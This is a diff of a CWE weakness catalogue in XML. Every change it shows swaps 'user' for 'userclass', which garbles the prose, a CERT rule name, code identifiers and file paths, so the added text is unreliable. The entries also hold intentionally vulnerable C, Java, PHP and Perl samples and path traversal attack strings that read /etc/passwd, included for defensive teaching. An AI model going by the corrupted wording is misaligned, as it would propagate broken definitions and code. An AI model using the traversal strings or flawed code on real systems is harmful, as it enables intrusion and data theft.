@@ -46,7 +46,7 @@
                <Scope>Availability</Scope>
                <Impact>Execute Unauthorized Code or Commands</Impact>
                <Impact>Modify Memory</Impact>
-               <Note>If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator.</Note>
+               <Note>If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the userclass is an administrator.</Note>
             </Consequence>
             <Consequence>
                <Scope>Availability</Scope>
@@ -271,7 +271,7 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example Demonstrative_Example_ID="DX-1">
-               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
+               <Intro_Text>This example takes an IP address from a userclass, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:10px;">
                         <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
@@ -288,7 +288,7 @@
                <Intro_Text>This example applies an encoding procedure to an input string and stores it into a buffer.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>char * copy_input(char *user_supplied_string){<xhtml:div style="margin-left:10px;">
-                        <xhtml:div>int i, dst_index;<xhtml:br/>char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<xhtml:br/>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<xhtml:div style="margin-left:10px;">die("user string too long, die evil hacker!");</xhtml:div>}<xhtml:br/>dst_index = 0;<xhtml:br/>for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<xhtml:div style="margin-left:10px;">
+                        <xhtml:div>int i, dst_index;<xhtml:br/>char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<xhtml:br/>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<xhtml:div style="margin-left:10px;">die("userclass string too long, die evil hacker!");</xhtml:div>}<xhtml:br/>dst_index = 0;<xhtml:br/>for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<xhtml:div style="margin-left:10px;">
                               <xhtml:div>if( '&amp;' == user_supplied_string[i] ){<xhtml:div style="margin-left:10px;">dst_buf[dst_index++] = '&amp;';<xhtml:br/>dst_buf[dst_index++] = 'a';<xhtml:br/>dst_buf[dst_index++] = 'm';<xhtml:br/>dst_buf[dst_index++] = 'p';<xhtml:br/>dst_buf[dst_index++] = ';';</xhtml:div>}<xhtml:br/>else if ('&lt;' == user_supplied_string[i] ){<xhtml:div style="margin-left:10px;">
                                     <xhtml:div>
                                        <xhtml:br/>
@@ -299,15 +299,15 @@
                            </xhtml:div>}<xhtml:br/>return dst_buf;</xhtml:div>
                      </xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</Body_Text>
+               <Body_Text>The programmer attempts to encode the ampersand character in the userclass-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-90">
-               <Intro_Text>The following example asks a user for an offset into an array to select an item.</Intro_Text>
+               <Intro_Text>The following example asks a userclass for an offset into an array to select an item.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>
                      <xhtml:br/>int main (int argc, char **argv) {<xhtml:div style="margin-left:10px;">char *items[] = {"boat", "car", "truck", "train"};<xhtml:br/>int index = GetUntrustedOffset();<xhtml:br/>printf("You selected %s\n", items[index-1]);</xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126).</Body_Text>
+               <Body_Text>The programmer allows the userclass to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126).</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-100">
                <Intro_Text>In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method</Intro_Text>
@@ -1051,7 +1051,7 @@
       </Weakness>
       <Weakness ID="190" Name="Integer Overflow or Wraparound" Abstraction="Base" Structure="Simple" Status="Stable">
          <Description>The software performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.</Description>
-         <Extended_Description>An integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc.</Extended_Description>
+         <Extended_Description>An integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using userclass-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc.</Extended_Description>
          <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1003" Ordinal="Primary"/>
@@ -1744,7 +1744,7 @@
                <Method>Automated Static Analysis</Method>
                <Description>
                   <xhtml:p>Some instances of improper input validation can be detected using automated static analysis.</xhtml:p>
-                  <xhtml:p>A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</xhtml:p>
+                  <xhtml:p>A static analysis tool might allow the userclass to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</xhtml:p>
                   <xhtml:p>Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                </Description>
             </Detection_Method>
@@ -1913,7 +1913,7 @@
                <Phase>Architecture and Design</Phase>
                <Description>
                   <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
-                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>
+                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the userclass about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>
                </Description>
             </Mitigation>
             <Mitigation>
@@ -1942,24 +1942,24 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example Demonstrative_Example_ID="DX-135">
-               <Intro_Text>This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.</Intro_Text>
+               <Intro_Text>This example demonstrates a shopping interaction in which the userclass is free to specify the quantity of items to be purchased and a total is calculated.</Intro_Text>
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>...<xhtml:br/>public static final double price = 20.00;<xhtml:br/>int quantity = currentUser.getAttribute("quantity");<xhtml:br/>double total = price * quantity;<xhtml:br/>chargeUser(total);<xhtml:br/>...</xhtml:div>
                </Example_Code>
-               <Body_Text>The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited.</Body_Text>
+               <Body_Text>The userclass has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the userclass would have their account credited instead of debited.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-136">
-               <Intro_Text>This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.</Intro_Text>
+               <Intro_Text>This example asks the userclass for a height and width of an m X n game board with a maximum dimension of 100 squares.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>...<xhtml:br/>#define MAX_DIM 100<xhtml:br/>...<xhtml:br/>
                      <xhtml:i>/* board dimensions */</xhtml:i>
                      <xhtml:br/>
                      <xhtml:br/>int m,n, error;<xhtml:br/>board_square_t *board;<xhtml:br/>printf("Please specify the board height: \n");<xhtml:br/>error = scanf("%d", &amp;m);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:10px;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>printf("Please specify the board width: \n");<xhtml:br/>error = scanf("%d", &amp;n);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:10px;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>if ( m &gt; MAX_DIM || n &gt; MAX_DIM ) {<xhtml:div style="margin-left:10px;">die("Value too large: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>board = (board_square_t*) malloc( m * n * sizeof(board_square_t));<xhtml:br/>...</xhtml:div>
                </Example_Code>
-               <Body_Text>While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.</Body_Text>
+               <Body_Text>While this code checks to make sure the userclass cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the userclass. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.</Intro_Text>
+               <Intro_Text>The following example shows a PHP application in which the programmer attempts to display a userclass's birthday and homepage.</Intro_Text>
                <Example_Code Nature="bad" Language="PHP">
                   <xhtml:div>$birthday = $_GET['birthday'];<xhtml:br/>$homepage = $_GET['homepage'];<xhtml:br/>echo "Birthday: $birthday&lt;br&gt;Homepage: &lt;a href=$homepage&gt;click here&lt;/a&gt;"</xhtml:div>
                </Example_Code>
@@ -1971,11 +1971,11 @@
                <Body_Text>Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-34">
-               <Intro_Text>The following example takes a user-supplied value to allocate an array of objects and then operates on the array.</Intro_Text>
+               <Intro_Text>The following example takes a userclass-supplied value to allocate an array of objects and then operates on the array.</Intro_Text>
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>private void buildList ( int untrustedListSize ){<xhtml:div style="margin-left:10px;">if ( 0 &gt; untrustedListSize ){<xhtml:div style="margin-left:10px;">die("Negative value supplied for list size, die evil hacker!");</xhtml:div>}<xhtml:br/>Widget[] list = new Widget [ untrustedListSize ];<xhtml:br/>list[0] = new Widget();</xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.</Body_Text>
+               <Body_Text>This example attempts to build a list from a userclass-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-110">
                <Intro_Text>This Android application has registered to handle a URL when sent an intent:</Intro_Text>
@@ -2175,7 +2175,7 @@
             </Taxonomy_Mapping>
             <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
                <Entry_ID>FIO30-C</Entry_ID>
-               <Entry_Name>Exclude user input from format strings</Entry_Name>
+               <Entry_Name>Exclude userclass input from format strings</Entry_Name>
                <Mapping_Fit>CWE More Abstract</Mapping_Fit>
             </Taxonomy_Mapping>
             <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
@@ -2696,7 +2696,7 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example Demonstrative_Example_ID="DX-38">
-               <Intro_Text>The following code checks validity of the supplied username and password and notifies the user of a successful or failed login.</Intro_Text>
+               <Intro_Text>The following code checks validity of the supplied username and password and notifies the userclass of a successful or failed login.</Intro_Text>
                <Example_Code Nature="bad" Language="Perl">
                   <xhtml:div>my $username=param('username');
                   <xhtml:br/>my $password=param('password');
@@ -2719,7 +2719,7 @@
                   </xhtml:div>
                </Example_Code>
                <Body_Text>In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials.</Body_Text>
-               <Body_Text>While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as:</Body_Text>
+               <Body_Text>While this type of information may be helpful to a userclass, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as:</Body_Text>
                <Example_Code Nature="result">
                   <xhtml:div>"Login Failed - incorrect username or password"</xhtml:div>
                </Example_Code>
@@ -2743,19 +2743,19 @@
                <Body_Text>The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-120">
-               <Intro_Text>This code stores location information about the current user:</Intro_Text>
+               <Intro_Text>This code stores location information about the current userclass:</Intro_Text>
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>currentUser.setLocation(locationClient.getLastLocation());<xhtml:br/>
                      <xhtml:i>...</xhtml:i>
                      <xhtml:br/>
                      <xhtml:br/>catch (Exception e) {<xhtml:div style="margin-left:10px;">AlertDialog.Builder builder = new AlertDialog.Builder(this);<xhtml:br/>builder.setMessage("Sorry, this application has experienced an error.");<xhtml:br/>AlertDialog alert = builder.create();<xhtml:br/>alert.show();<xhtml:br/>Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());</xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.</Body_Text>
+               <Body_Text>When the application encounters an exception it will write the userclass object to the log. Because the userclass object contains location information, the userclass's location is also written to the log.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-129">
                <Intro_Text>The following is an actual MySQL error statement:</Intro_Text>
                <Example_Code Nature="result" Language="SQL">
-                  <xhtml:div>Warning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4</xhtml:div>
+                  <xhtml:div>Warning: mysql_pconnect(): Access denied for userclass: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4</xhtml:div>
                </Example_Code>
                <Body_Text>The error clearly exposes the database credentials.</Body_Text>
             </Demonstrative_Example>
@@ -2764,7 +2764,7 @@
                <Example_Code Nature="bad" Language="JSP">
                   <xhtml:div>Social Security Number: &lt;%= ssn %&gt;&lt;/br&gt;Credit Card Number: &lt;%= ccn %&gt;</xhtml:div>
                </Example_Code>
-               <Body_Text>The code displays a user's credit card and social security numbers, even though they aren't absolutely necessary.</Body_Text>
+               <Body_Text>The code displays a userclass's credit card and social security numbers, even though they aren't absolutely necessary.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-131">
                <Intro_Text>The following program changes its behavior based on a debug flag.</Intro_Text>
@@ -2778,7 +2778,7 @@
                <Body_Text>The code writes sensitive debug information to the client browser if the "debugEnabled" flag is set to true .</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-111">
-               <Intro_Text>This code uses location to determine the user's current US State location.</Intro_Text>
+               <Intro_Text>This code uses location to determine the userclass's current US State location.</Intro_Text>
                <Body_Text>First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:</Body_Text>
                <Example_Code Nature="bad" Language="XML">
                   <xhtml:div>&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;</xhtml:div>
@@ -2787,7 +2787,7 @@
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>Location userCurrLocation;<xhtml:br/>userCurrLocation = locationClient.getLastLocation();<xhtml:br/>deriveStateFromCoords(userCurrLocation);</xhtml:div>
                </Example_Code>
-               <Body_Text>While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.</Body_Text>
+               <Body_Text>While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the userclass is in.</Body_Text>
             </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
@@ -2813,7 +2813,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2002-1725</Reference>
-               <Description>Script calls phpinfo(), revealing system configuration to web user</Description>
+               <Description>Script calls phpinfo(), revealing system configuration to web userclass</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1725</Link>
             </Observed_Example>
             <Observed_Example>
@@ -2833,7 +2833,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2003-0190</Reference>
-               <Description>Product immediately sends an error message when a user does not exist, which allows remote attackers to determine valid usernames via a timing attack.</Description>
+               <Description>Product immediately sends an error message when a userclass does not exist, which allows remote attackers to determine valid usernames via a timing attack.</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0190</Link>
             </Observed_Example>
             <Observed_Example>
@@ -2848,7 +2848,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2008-4638</Reference>
-               <Description>Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</Description>
+               <Description>Composite: application running with high privileges (CWE-250) allows userclass to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4638</Link>
             </Observed_Example>
             <Observed_Example>
@@ -3167,7 +3167,7 @@
             <Consequence>
                <Scope>Availability</Scope>
                <Impact>DoS: Crash, Exit, or Restart</Impact>
-               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.</Note>
+               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every userclass of the software.</Note>
             </Consequence>
          </Common_Consequences>
          <Detection_Methods>
@@ -3395,7 +3395,7 @@
                <Description>
                   <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                   <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
-		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
+		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a userclass account exists or not.</xhtml:p>
                   <xhtml:p>In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.</xhtml:p>
                </Description>
             </Mitigation>
@@ -3408,12 +3408,12 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example Demonstrative_Example_ID="DX-27">
-               <Intro_Text>The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.</Intro_Text>
+               <Intro_Text>The following code could be for a social networking application in which each userclass's profile information is stored in a separate file. All files are stored in a single directory.</Intro_Text>
                <Example_Code Nature="bad" Language="Perl">
-                  <xhtml:div>my $dataPath = "/users/cwe/profiles";<xhtml:br/>my $username = param("user");<xhtml:br/>my $profilePath = $dataPath . "/" . $username;<xhtml:br/>
+                  <xhtml:div>my $dataPath = "/users/cwe/profiles";<xhtml:br/>my $username = param("userclass");<xhtml:br/>my $profilePath = $dataPath . "/" . $username;<xhtml:br/>
                      <xhtml:br/>open(my $fh, "&lt;$profilePath") || ExitError("profile read error: $profilePath");<xhtml:br/>print "&lt;ul&gt;\n";<xhtml:br/>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:10px;">print "&lt;li&gt;$_&lt;/li&gt;\n";</xhtml:div>}<xhtml:br/>print "&lt;/ul&gt;\n";</xhtml:div>
                </Example_Code>
-               <Body_Text>While the programmer intends to access files such as "/users/cwe/profiles/alice" or "/users/cwe/profiles/bob", there is no verification of the incoming user parameter. An attacker could provide a string such as:</Body_Text>
+               <Body_Text>While the programmer intends to access files such as "/users/cwe/profiles/alice" or "/users/cwe/profiles/bob", there is no verification of the incoming userclass parameter. An attacker could provide a string such as:</Body_Text>
                <Example_Code Nature="attack">
                   <xhtml:div>../../../etc/passwd</xhtml:div>
                </Example_Code>
@@ -3426,19 +3426,19 @@
                   <xhtml:div>/etc/passwd</xhtml:div>
                </Example_Code>
                <Body_Text>As a result, the attacker could read the entire text of the password file.</Body_Text>
-               <Body_Text>Notice how this code also contains an error message information leak (CWE-209) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.</Body_Text>
+               <Body_Text>Notice how this code also contains an error message information leak (CWE-209) if the userclass parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-18">
                <Intro_Text>In the example below, the path to a dictionary file is read from a system property and used to initialize a File object.</Intro_Text>
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>String filename = System.getProperty("com.domain.application.dictionaryFile");<xhtml:br/>File dictionaryFile = new File(filename);</xhtml:div>
                </Example_Code>
-               <Body_Text>However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory.</Body_Text>
+               <Body_Text>However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or userclass home directory.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-2">
-               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
+               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/userclass/ directory and attempts to read the file in the final resulting path.</Intro_Text>
                <Example_Code Nature="bad" Language="Perl">
-                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
+                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/userclass/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
                </Example_Code>
                <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
                <Example_Code Nature="attack">
@@ -3448,9 +3448,9 @@
                <Example_Code Nature="result">
                   <xhtml:div>../../etc/passwd</xhtml:div>
                </Example_Code>
-               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
+               <Body_Text>This value is then concatenated with the /home/userclass/ directory:</Body_Text>
                <Example_Code Nature="result">
-                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
+                  <xhtml:div>/home/userclass/../../etc/passwd</xhtml:div>
                </Example_Code>
                <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
             </Demonstrative_Example>
@@ -3547,7 +3547,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2008-5748</Reference>
-               <Description>Chain: external control of values for user's desired language and theme enables path traversal.</Description>
+               <Description>Chain: external control of values for userclass's desired language and theme enables path traversal.</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5748</Link>
             </Observed_Example>
             <Observed_Example>
@@ -4248,7 +4248,7 @@
                <Method>Automated Static Analysis</Method>
                <Description>
                   <xhtml:p>Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
-                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
+                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any userclass and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
                </Description>
                <Effectiveness>Limited</Effectiveness>
             </Detection_Method>
@@ -4381,24 +4381,24 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example>
-               <Intro_Text>The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to "remember" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the "Administrator" username, as recorded in the user cookie.</Intro_Text>
+               <Intro_Text>The following code intends to ensure that the userclass is already logged in. If not, the code performs authentication with the userclass-provided username and password. If successful, it sets the loggedin and userclass cookies to "remember" that the userclass has already logged in. Finally, the code performs administrator tasks if the logged-in userclass has the "Administrator" username, as recorded in the userclass cookie.</Intro_Text>
                <Example_Code Nature="bad" Language="Perl">
                   <xhtml:div>my $q = new CGI;<xhtml:br/>
                      <xhtml:br/>if ($q-&gt;cookie('loggedin') ne "true") {<xhtml:div style="margin-left:10px;">
                         <xhtml:div>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:10px;">ExitError("Error: you need to log in first");</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">
-                              <xhtml:div># Set loggedin and user cookies.<xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:10px;">-name =&gt; 'loggedin',<xhtml:br/>-value =&gt; 'true'<xhtml:br/>);</xhtml:div>
-                                 <xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:10px;">-name =&gt; 'user',<xhtml:br/>-value =&gt; $q-&gt;param('username')<xhtml:br/>);</xhtml:div>
